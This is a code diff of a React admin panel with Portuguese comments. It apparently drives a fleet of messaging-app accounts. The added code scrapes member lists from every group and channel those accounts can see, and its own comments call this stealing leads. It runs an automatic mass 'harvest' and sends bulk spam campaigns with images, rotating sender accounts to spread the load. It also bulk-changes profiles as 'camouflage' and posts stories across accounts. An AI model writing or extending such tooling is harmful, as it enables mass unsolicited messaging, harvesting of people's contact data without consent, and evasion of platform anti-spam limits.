@@ -4,37 +4,39 @@ export default function AdminPanel() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [passwordInput, setPasswordInput] = useState('');
   
-  // Tabs
+  // Controle de Abas
   const [tab, setTab] = useState('dashboard'); 
+  
+  // Dados Principais
   const [sessions, setSessions] = useState([]);
   const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
   const [logs, setLogs] = useState([]);
+  
+  // Estados do Disparo (CRM)
   const [processing, setProcessing] = useState(false);
-
-  // Estados do Disparo e Contas
   const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
+  const [imgUrl, setImgUrl] = useState(''); // URL da Imagem para envio
   const [selectedPhones, setSelectedPhones] = useState(new Set());
   const [progress, setProgress] = useState(0);
   const [checkingStatus, setCheckingStatus] = useState(false);
 
-  // --- GOD MODE (Espião Global) ---
+  // Estados do God Mode (Espião)
   const [allGroups, setAllGroups] = useState([]);
   const [allChannels, setAllChannels] = useState([]);
+  const [harvestedIds, setHarvestedIds] = useState(new Set()); // Memória de quem já foi roubado
   const [isScanning, setIsScanning] = useState(false);
   const [scanProgress, setScanProgress] = useState(0);
   const [filterNumber, setFilterNumber] = useState('');
 
-  // Estados de Chat e Visualização
+  // Estados Auxiliares (Modais e Processos)
   const [viewingChat, setViewingChat] = useState(null);
   const [chatHistory, setChatHistory] = useState([]);
   const [loadingHistory, setLoadingHistory] = useState(false);
-
-  // MODO ASPIRADOR (Auto Harvest)
   const [isHarvestingAll, setIsHarvestingAll] = useState(false);
   const [totalHarvestedSession, setTotalHarvestedSession] = useState(0);
   const stopHarvestRef = useRef(false);
 
-  // Tools
+  // Estados de Ferramentas
   const [newName, setNewName] = useState('');
   const [photoUrl, setPhotoUrl] = useState('');
   const [storyUrl, setStoryUrl] = useState('');
@@ -42,11 +44,23 @@ export default function AdminPanel() {
 
   // --- INICIALIZAÇÃO ---
   useEffect(() => {
+    // Recupera dados salvos localmente para não perder o scan ao dar F5
     const savedGroups = localStorage.getItem('godModeGroups');
     const savedChannels = localStorage.getItem('godModeChannels');
     if (savedGroups) setAllGroups(JSON.parse(savedGroups));
     if (savedChannels) setAllChannels(JSON.parse(savedChannels));
+    
+    // Carrega a lista de grupos já roubados do banco
+    fetchHarvested();
   }, []);
+
+  const fetchHarvested = async () => {
+      try {
+          const res = await fetch('/api/get-harvested');
+          const data = await res.json();
+          if(data.harvestedIds) setHarvestedIds(new Set(data.harvestedIds));
+      } catch(e) {}
+  };
 
   const handleLogin = async (e) => {
     e.preventDefault();
@@ -57,12 +71,7 @@ export default function AdminPanel() {
         body: JSON.stringify({ password: passwordInput })
       });
       const data = await res.json();
-      if(data.success) { 
-          setIsAuthenticated(true); 
-          fetchData(); 
-      } else {
-          alert('Senha incorreta');
-      }
+      if(data.success) { setIsAuthenticated(true); fetchData(); } else { alert('Senha incorreta'); }
     } catch (e) { alert('Erro de conexão'); }
   };
 
@@ -70,52 +79,54 @@ export default function AdminPanel() {
     try {
       const sRes = await fetch('/api/list-sessions');
       const sData = await sRes.json();
-      // Mantém o status 'is_active' se já tivermos verificado localmente, senão usa do banco
+      // Mescla o status atual (visual) com os dados novos do banco
       setSessions(prev => {
           const newSessions = sData.sessions || [];
           return newSessions.map(ns => {
               const old = prev.find(p => p.phone_number === ns.phone_number);
-              return { ...ns, is_active: old ? old.is_active : ns.is_active }; // Preserva estado visual
+              return { ...ns, is_active: old ? old.is_active : ns.is_active };
           });
       });
       
       const stRes = await fetch('/api/stats');
       if (stRes.ok) setStats(await stRes.json());
+      
+      fetchHarvested(); // Atualiza a lista de "Já Roubados"
     } catch (e) { console.error(e); }
   };
 
   const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);
 
-  // --- FUNÇÕES DE DASHBOARD & CONTAS ---
-  
-  // 1. Verificar Status (Online/Offline)
+  // --- FUNÇÕES: GESTÃO DE CONTAS (STATUS) ---
   const checkAllStatus = async () => {
       if(sessions.length === 0) return;
       setCheckingStatus(true);
       addLog('🔍 Verificando saúde das conexões...');
       
       let newSessions = [...sessions];
-      
-      // Verifica em paralelo (blocos de 5 para não travar)
+      // Verifica um por um (poderia ser em paralelo, mas sequencial evita travar a Vercel)
       for(let i=0; i<newSessions.length; i++) {
           try {
               const res = await fetch('/api/check-status', {
-                  method: 'POST',
-                  body: JSON.stringify({ phone: newSessions[i].phone_number }),
-                  headers: {'Content-Type': 'application/json'}
+                  method: 'POST', body: JSON.stringify({ phone: newSessions[i].phone_number }), headers: {'Content-Type': 'application/json'}
               });
               const data = await res.json();
               
-              // Atualiza visualmente na hora
               newSessions[i].is_active = (data.status === 'alive');
-              setSessions([...newSessions]); 
-              
-          } catch(e) { console.error(e); }
+              setSessions([...newSessions]); // Atualiza visualmente na hora
+          } catch(e) {}
       }
       setCheckingStatus(false);
-      addLog('✅ Verificação completa.');
+      addLog('✅ Verificação de status completa.');
   };
 
+  const handleDelete = async (phone) => {
+      if(!confirm(`Remover conta ${phone}?`)) return;
+      await fetch('/api/delete-session', { method: 'POST', body: JSON.stringify({phone}), headers: {'Content-Type': 'application/json'} });
+      setSessions(prev => prev.filter(s => s.phone_number !== phone));
+  };
+
+  // --- FUNÇÕES: DISPARO (CRM) ---
   const toggleSelect = (phone) => {
     const newSet = new Set(selectedPhones);
     if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
@@ -124,29 +135,21 @@ export default function AdminPanel() {
 
   const selectAll = () => {
       const newSet = new Set();
-      // Só seleciona quem está marcado como ATIVO (Verde)
-      sessions.forEach(s => { if(s.is_active) newSet.add(s.phone_number) });
+      sessions.forEach(s => { if(s.is_active) newSet.add(s.phone_number) }); // Só seleciona quem está ONLINE
       setSelectedPhones(newSet);
       addLog(`✅ ${newSet.size} contas ativas selecionadas.`);
   };
 
-  const handleDelete = async (phone) => {
-      if(!confirm(`Remover ${phone}?`)) return;
-      await fetch('/api/delete-session', { method: 'POST', body: JSON.stringify({phone}), headers: {'Content-Type': 'application/json'} });
-      setSessions(prev => prev.filter(s => s.phone_number !== phone));
-  };
-
-  // --- DISPARO TURBO ---
   const startRealCampaign = async () => {
-     if (selectedPhones.size === 0) return alert('Selecione contas! (Dica: Use o botão "Check" e depois "Selecionar Todos Ativos")');
-     
-     if(!confirm(`⚠️ INICIAR DISPARO TURBO?\n\nAlvos: ${stats.pending}\nContas Remetentes: ${selectedPhones.size}`)) return;
+     if (selectedPhones.size === 0) return alert('Selecione contas ativas!');
+     if(!confirm(`⚠️ INICIAR DISPARO TURBO?\n\nAlvos Pendentes: ${stats.pending}\nContas Remetentes: ${selectedPhones.size}\nEnviar Imagem: ${imgUrl ? 'SIM' : 'NÃO'}`)) return;
 
      setProcessing(true);
      setProgress(0);
      addLog('🚀 Iniciando campanha massiva...');
      
      try {
+         // 1. Pega leads do banco
          const res = await fetch('/api/get-campaign-leads'); 
          const data = await res.json();
          const leads = data.leads || [];
@@ -154,13 +157,14 @@ export default function AdminPanel() {
          if (leads.length === 0) { setProcessing(false); return alert('Sem leads pendentes!'); }
          
          const phones = Array.from(selectedPhones);
-         const BATCH_SIZE = 20; // Paralelismo
+         const BATCH_SIZE = 20; // Envia 20 de cada vez (Paralelismo)
          
          for (let i = 0; i < leads.length; i += BATCH_SIZE) {
              const batch = leads.slice(i, i + BATCH_SIZE);
              const promises = [];
 
              batch.forEach((lead, index) => {
+                 // Distribuição Round Robin (Rodízio de Contas)
                  const senderIndex = (i + index) % phones.length;
                  const sender = phones[senderIndex];
                  
@@ -168,19 +172,27 @@ export default function AdminPanel() {
                      fetch('/api/dispatch', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ senderPhone: sender, target: lead.user_id, message: msg, leadDbId: lead.id })
+                        body: JSON.stringify({ 
+                            senderPhone: sender, 
+                            target: lead.user_id, 
+                            message: msg, 
+                            imageUrl: imgUrl, // Envia a imagem se tiver
+                            leadDbId: lead.id 
+                        })
                      }).then(r => r.json()).then(d => {
                          if(!d.success) addLog(`❌ Falha ${sender}: ${d.error}`);
                      })
                  );
              });
 
+             // Aguarda o lote terminar
              await Promise.all(promises);
              
+             // Atualiza barra de progresso
              const percent = Math.round(((i + batch.length) / leads.length) * 100);
              setProgress(percent);
              
-             // Pequeno delay
+             // Delay de segurança
              await new Promise(r => setTimeout(r, 1000));
          }
          addLog('✅ Campanha finalizada.'); fetchData();
@@ -188,7 +200,7 @@ export default function AdminPanel() {
      setProcessing(false);
   };
 
-  // --- GOD MODE: ESCANEAR REDE ---
+  // --- FUNÇÕES: GOD MODE (SCAN & HARVEST) ---
   const scanNetwork = async () => {
       if (sessions.length === 0) return alert("Nenhuma conta conectada.");
       setIsScanning(true);
@@ -218,34 +230,41 @@ export default function AdminPanel() {
           } catch (e) { console.error(`Erro ao ler ${phone}`); }
       }
 
+      // Remove duplicatas
       const uniqueGroups = [...new Map(groups.map(item => [item.id, item])).values()];
       const uniqueChannels = [...new Map(channels.map(item => [item.id, item])).values()];
 
+      // Ordena por tamanho
       uniqueGroups.sort((a,b) => b.participantsCount - a.participantsCount);
       uniqueChannels.sort((a,b) => b.participantsCount - a.participantsCount);
 
       setAllGroups(uniqueGroups);
       setAllChannels(uniqueChannels);
+      
+      // Salva no navegador
       localStorage.setItem('godModeGroups', JSON.stringify(uniqueGroups));
       localStorage.setItem('godModeChannels', JSON.stringify(uniqueChannels));
 
       setIsScanning(false);
-      alert(`Varredura completa! ${uniqueGroups.length} Grupos e ${uniqueChannels.length} Canais.`);
+      fetchHarvested(); // Atualiza os marcadores visuais
+      alert(`Varredura completa! ${uniqueGroups.length} Grupos e ${uniqueChannels.length} Canais encontrados.`);
   };
 
-  // --- MODO ASPIRADOR (MASS HARVEST) ---
+  // --- MODO ASPIRADOR (COLETA AUTOMÁTICA) ---
   const startMassHarvest = async () => {
-      const targets = [...allGroups, ...allChannels];
-      if (targets.length === 0) return alert("Escaneie a rede primeiro!");
+      // Filtra apenas o que AINDA NÃO FOI COLHIDO
+      const targets = [...allGroups, ...allChannels].filter(c => !harvestedIds.has(c.id));
       
-      if (!confirm(`⚠️ MODO ASPIRADOR\n\nIsso vai varrer ${targets.length} grupos/canais automaticamente.\n\nO processo pode demorar. Deseja iniciar?`)) return;
+      if (targets.length === 0) return alert("Todos os grupos listados já foram colhidos!");
+      
+      if (!confirm(`⚠️ MODO ASPIRADOR\n\nIsso vai varrer ${targets.length} NOVOS grupos/canais automaticamente.\n\nDeseja iniciar?`)) return;
 
       setIsHarvestingAll(true);
       stopHarvestRef.current = false;
       setTotalHarvestedSession(0);
       let sessionCount = 0;
 
-      addLog(`🕷️ Iniciando coleta em massa...`);
+      addLog(`🕷️ Iniciando coleta em massa de ${targets.length} fontes...`);
 
       for (let i = 0; i < targets.length; i++) {
           if (stopHarvestRef.current) {
@@ -269,19 +288,23 @@ export default function AdminPanel() {
               });
               const data = await res.json();
               
-              if(data.success && data.count > 0) {
+              if(data.success) {
                   sessionCount += data.count;
                   setTotalHarvestedSession(sessionCount);
-                  addLog(`✅ +${data.count} leads de "${chat.title}"`);
+                  // Marca como colhido visualmente na hora
+                  setHarvestedIds(prev => new Set(prev).add(chat.id));
+                  
+                  if (data.count > 0) addLog(`✅ +${data.count} leads de "${chat.title}"`);
               }
           } catch (e) {}
 
-          await new Promise(r => setTimeout(r, 2000)); // Delay Anti-Flood
+          // Delay Anti-Flood (2s)
+          await new Promise(r => setTimeout(r, 2000));
       }
 
       setIsHarvestingAll(false);
       document.title = "Admin";
-      addLog(`🏁 COLETA FINALIZADA! Total: ${sessionCount} novos leads.`);
+      addLog(`🏁 COLETA FINALIZADA! Total nesta sessão: ${sessionCount} novos leads.`);
       fetchData();
   };
 
@@ -307,13 +330,26 @@ export default function AdminPanel() {
   const stealLeads = async (chat) => {
       if(!confirm(`Roubar leads de "${chat.title}"?`)) return;
       addLog(`🕷️ Extraindo de ${chat.title}...`);
+      
       const res = await fetch('/api/spy/harvest', { 
           method: 'POST', 
-          body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id, chatName: chat.title, isChannel: chat.type === 'Canal' }), 
+          body: JSON.stringify({ 
+              phone: chat.ownerPhone, 
+              chatId: chat.id, 
+              chatName: chat.title, 
+              isChannel: chat.type === 'Canal' 
+          }), 
           headers: {'Content-Type': 'application/json'} 
       });
       const data = await res.json();
-      if(data.success) { addLog(`✅ ${data.message}`); fetchData(); } else { addLog(`❌ Erro: ${data.error}`); }
+      
+      if(data.success) {
+          addLog(`✅ +${data.count} leads.`);
+          setHarvestedIds(prev => new Set(prev).add(chat.id)); // Marca verde
+          fetchData(); 
+      } else {
+          addLog(`❌ Erro: ${data.error}`);
+      }
   };
 
   const cloneGroup = async (chat) => {
@@ -336,10 +372,21 @@ export default function AdminPanel() {
     setProcessing(false); addLog('✅ Feito.');
   };
 
+  const handlePostStory = async () => {
+      if (selectedPhones.size === 0) return alert('Selecione contas!');
+      setProcessing(true);
+      for (const phone of Array.from(selectedPhones)) {
+          addLog(`📸 Story em ${phone}...`);
+          await fetch('/api/post-story', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) });
+      }
+      setProcessing(false); addLog('✅ Feito.');
+  };
+
+  // Filtros de visualização
   const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
   const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;
   
-  // Contadores
+  // Contadores de Status
   const activeCount = sessions.filter(s => s.is_active).length;
   const deadCount = sessions.length - activeCount;
 
@@ -377,25 +424,24 @@ export default function AdminPanel() {
         )}
 
         <div style={{marginBottom:'20px', borderBottom:'1px solid #30363d', paddingBottom:'10px'}}>
-            <button onClick={()=>setTab('spy')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', border:'1px solid #8957e5', color:'white', borderRadius:'5px', cursor:'pointer'}}>👁️ GOD MODE</button>
             <button onClick={()=>setTab('dashboard')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', border:'1px solid #238636', color:'white', borderRadius:'5px', cursor:'pointer'}}>🚀 CRM (TURBO)</button>
+            <button onClick={()=>setTab('spy')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', border:'1px solid #8957e5', color:'white', borderRadius:'5px', cursor:'pointer'}}>👁️ GOD MODE</button>
             <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', border:'1px solid #1f6feb', color:'white', borderRadius:'5px', cursor:'pointer'}}>🛠️ TOOLS</button>
         </div>
 
+        {/* --- ABA ESPIÃO (GOD MODE) --- */}
         {tab === 'spy' && (
             <div>
                 <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'20px', background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                     <div>
                         <h2 style={{margin:0, color:'white'}}>Radar Global</h2>
-                        <div style={{fontSize:'12px', color:'#8b949e'}}>
-                            {allGroups.length} Grupos | {allChannels.length} Canais
-                        </div>
+                        <div style={{fontSize:'12px', color:'#8b949e'}}>{allGroups.length} Grupos | {allChannels.length} Canais</div>
                     </div>
                     <div style={{display:'flex', gap:'10px', alignItems:'center'}}>
                         {isHarvestingAll && <div style={{color:'#00ff00', fontWeight:'bold', marginRight:'10px'}}>ASPIRANDO: +{totalHarvestedSession} leads...</div>}
                         
                         {!isHarvestingAll ? (
-                             <button onClick={startMassHarvest} style={{padding:'10px 20px', background:'#238636', color:'white', border:'none', borderRadius:'5px', cursor:'pointer', fontWeight:'bold'}}>🕷️ ASPIRAR TUDO</button>
+                             <button onClick={startMassHarvest} style={{padding:'10px 20px', background:'#238636', color:'white', border:'none', borderRadius:'5px', cursor:'pointer', fontWeight:'bold'}}>🕷️ ASPIRAR NOVOS</button>
                         ) : (
                              <button onClick={stopHarvest} style={{padding:'10px 20px', background:'#ff5c5c', color:'white', border:'none', borderRadius:'5px', cursor:'pointer', fontWeight:'bold'}}>🛑 PARAR</button>
                         )}
@@ -406,37 +452,44 @@ export default function AdminPanel() {
                 </div>
 
                 <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'20px'}}>
+                    {/* GRUPOS */}
                     <div style={{background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                         <h3 style={{color:'#d29922', borderBottom:'1px solid #30363d', paddingBottom:'10px', marginTop:0}}>👥 GRUPOS ({filteredGroups.length})</h3>
                         <div style={{maxHeight:'70vh', overflowY:'auto'}}>
-                            {filteredGroups.map(g => (
-                                <div key={g.id} style={{display:'flex', alignItems:'center', gap:'10px', padding:'10px', borderBottom:'1px solid #21262d'}}>
+                            {filteredGroups.map(g => {
+                                const isHarvested = harvestedIds.has(g.id);
+                                return (
+                                <div key={g.id} style={{display:'flex', alignItems:'center', gap:'10px', padding:'10px', borderBottom:'1px solid #21262d', opacity: isHarvested ? 0.5 : 1}}>
                                     <div style={{width:'40px', height:'40px', borderRadius:'50%', background:'#30363d', overflow:'hidden'}}>{g.photo ? <img src={g.photo} style={{width:'100%', height:'100%'}}/> : <div style={{textAlign:'center', lineHeight:'40px'}}>👥</div>}</div>
-                                    <div style={{flex:1}}><div style={{fontWeight:'bold', color:'white', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', maxWidth:'200px'}}>{g.title}</div><div style={{fontSize:'11px', color:'#8b949e'}}>{g.participantsCount} leads • {g.ownerPhone}</div></div>
+                                    <div style={{flex:1}}><div style={{fontWeight:'bold', color: isHarvested ? '#00ff00' : 'white'}}>{g.title} {isHarvested && '✅'}</div><div style={{fontSize:'11px', color:'#8b949e'}}>{g.participantsCount} leads</div></div>
                                     <button onClick={()=>openChat(g)} style={{background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'4px', cursor:'pointer'}}>👁️</button>
-                                    <button onClick={()=>stealLeads(g)} style={{background:'#d29922', border:'none', color:'white', borderRadius:'4px', cursor:'pointer', fontWeight:'bold', fontSize:'12px', padding:'5px 10px'}}>🕷️</button>
+                                    <button onClick={()=>stealLeads(g)} style={{background: isHarvested ? '#238636' : '#d29922', border:'none', color:'white', borderRadius:'4px', cursor:'pointer', fontWeight:'bold', fontSize:'12px', padding:'5px 10px'}}>{isHarvested ? 'RE-COLHER' : '🕷️'}</button>
                                 </div>
-                            ))}
+                            )})}
                         </div>
                     </div>
 
+                    {/* CANAIS */}
                     <div style={{background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                         <h3 style={{color:'#3390ec', borderBottom:'1px solid #30363d', paddingBottom:'10px', marginTop:0}}>📢 CANAIS ({filteredChannels.length})</h3>
                         <div style={{maxHeight:'70vh', overflowY:'auto'}}>
-                            {filteredChannels.map(c => (
-                                <div key={c.id} style={{display:'flex', alignItems:'center', gap:'10px', padding:'10px', borderBottom:'1px solid #21262d'}}>
+                            {filteredChannels.map(c => {
+                                const isHarvested = harvestedIds.has(c.id);
+                                return (
+                                <div key={c.id} style={{display:'flex', alignItems:'center', gap:'10px', padding:'10px', borderBottom:'1px solid #21262d', opacity: isHarvested ? 0.5 : 1}}>
                                     <div style={{width:'40px', height:'40px', borderRadius:'50%', background:'#30363d', overflow:'hidden'}}>{c.photo ? <img src={c.photo} style={{width:'100%', height:'100%'}}/> : <div style={{textAlign:'center', lineHeight:'40px'}}>📢</div>}</div>
-                                    <div style={{flex:1}}><div style={{fontWeight:'bold', color:'white', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', maxWidth:'200px'}}>{c.title}</div><div style={{fontSize:'11px', color:'#8b949e'}}>{c.participantsCount} inscritos • {c.ownerPhone}</div></div>
+                                    <div style={{flex:1}}><div style={{fontWeight:'bold', color: isHarvested ? '#00ff00' : 'white'}}>{c.title} {isHarvested && '✅'}</div><div style={{fontSize:'11px', color:'#8b949e'}}>{c.participantsCount} inscritos</div></div>
                                     <button onClick={()=>openChat(c)} style={{background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'4px', cursor:'pointer'}}>👁️</button>
-                                    <button onClick={()=>stealLeads(c)} style={{background:'#1f6feb', border:'none', color:'white', borderRadius:'4px', cursor:'pointer', fontWeight:'bold', fontSize:'10px', padding:'5px 10px'}}>🕷️ TENTAR</button>
+                                    <button onClick={()=>stealLeads(c)} style={{background: isHarvested ? '#238636' : '#1f6feb', border:'none', color:'white', borderRadius:'4px', cursor:'pointer', fontWeight:'bold', fontSize:'10px', padding:'5px 10px'}}>{isHarvested ? 'TENTAR DNV' : '🕷️ TENTAR'}</button>
                                 </div>
-                            ))}
+                            )})}
                         </div>
                     </div>
                 </div>
             </div>
         )}
 
+        {/* --- ABA DASHBOARD (DISPARO & CONTAS) --- */}
         {tab === 'dashboard' && (
              <div style={{display:'grid', gridTemplateColumns:'2fr 1fr', gap:'20px'}}>
                 
@@ -447,20 +500,27 @@ export default function AdminPanel() {
                         <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #238636'}}><h2 style={{margin:0, color:'#238636'}}>{stats.sent}</h2><small>Enviados</small></div>
                         <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #3390ec'}}><h2 style={{margin:0, color:'#3390ec'}}>{progress}%</h2><small>Progresso</small></div>
                     </div>
-                    <h3>Disparo em Massa</h3>
-                    <textarea value={msg} onChange={e=>setMsg(e.target.value)} style={{width:'100%', height:'80px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'10px'}}/>
-                    <button onClick={startRealCampaign} disabled={processing} style={{marginTop:'15px', width:'100%', padding:'20px', background: processing ? '#21262d' : '#238636', color:'white', border:'none', cursor:'pointer', fontWeight:'bold'}}>{processing ? 'ENVIANDO...' : 'INICIAR DISPARO'}</button>
+                    
+                    <h3>Disparo com Imagem 📸</h3>
+                    <input type="text" placeholder="URL da Imagem (Ex: https://i.imgur.com/...jpg)" value={imgUrl} onChange={e=>setImgUrl(e.target.value)} style={{width:'100%', marginBottom:'10px', padding:'10px', background:'#0d1117', border:'1px solid #30363d', color:'white'}} />
+                    
+                    <textarea value={msg} onChange={e=>setMsg(e.target.value)} placeholder="Sua mensagem..." style={{width:'100%', height:'80px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'10px'}}/>
+                    
+                    <button onClick={startRealCampaign} disabled={processing} style={{marginTop:'15px', width:'100%', padding:'20px', background: processing ? '#21262d' : '#238636', color:'white', border:'none', cursor:'pointer', fontWeight:'bold'}}>{processing ? 'ENVIANDO...' : 'INICIAR DISPARO TURBO'}</button>
+                    
                     <div style={{marginTop:'20px', height:'150px', overflowY:'auto', background:'#000', padding:'10px', fontSize:'12px'}}>{logs.map((l,i)=><div key={i}>{l}</div>)}</div>
                 </div>
 
-                {/* COLUNA DIREITA: LISTA DE CONTAS (AGORA RESTAURADA) */}
+                {/* COLUNA DIREITA: LISTA DE CONTAS */}
                 <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                     <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'15px'}}>
                         <h3 style={{margin:0}}>Contas ({sessions.length})</h3>
                         <button onClick={checkAllStatus} disabled={checkingStatus} style={{fontSize:'12px', padding:'5px 10px', background:'#1f6feb', color:'white', border:'none', borderRadius:'4px', cursor:'pointer'}}>{checkingStatus ? '...' : '🔄 Check'}</button>
                     </div>
                     <div style={{display:'flex', gap:'10px', marginBottom:'15px', fontSize:'12px'}}><span style={{color:'#238636'}}>🟢 {activeCount} Online</span><span style={{color:'#ff5c5c'}}>🔴 {deadCount} Offline</span></div>
+                    
                     <button onClick={selectAll} style={{width:'100%', marginBottom:'10px', padding:'8px', background:'#30363d', color:'white', border:'none', cursor:'pointer'}}>Selecionar Todos Ativos</button>
+                    
                     <div style={{maxHeight:'600px', overflowY:'auto'}}>
                         {sessions.map(s => (
                             <div key={s.id} style={{padding:'10px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between', alignItems:'center', background: selectedPhones.has(s.phone_number) ? '#21262d' : 'transparent'}}>
@@ -474,12 +534,18 @@ export default function AdminPanel() {
              </div>
         )}
         
+        {/* --- ABA TOOLS --- */}
         {tab === 'tools' && (
              <div style={{ backgroundColor: '#161b22', padding: '20px' }}>
                 <h3>🎭 Camuflagem em Massa</h3>
                 <input type="text" placeholder="Nome" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                 <input type="text" placeholder="Foto URL" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                 <button onClick={handleUpdateProfile} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none' }}>ATUALIZAR PERFIS</button>
+                
+                <h3 style={{marginTop:'30px'}}>📸 Postar Story</h3>
+                <input type="text" placeholder="Mídia URL" value={storyUrl} onChange={e => setStoryUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
+                <input type="text" placeholder="Legenda" value={storyCaption} onChange={e => setStoryCaption(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
+                <button onClick={handlePostStory} style={{ width: '100%', padding: '10px', background: '#1f6feb', color: 'white', border: 'none' }}>POSTAR</button>
             </div>
         )}
     </div>
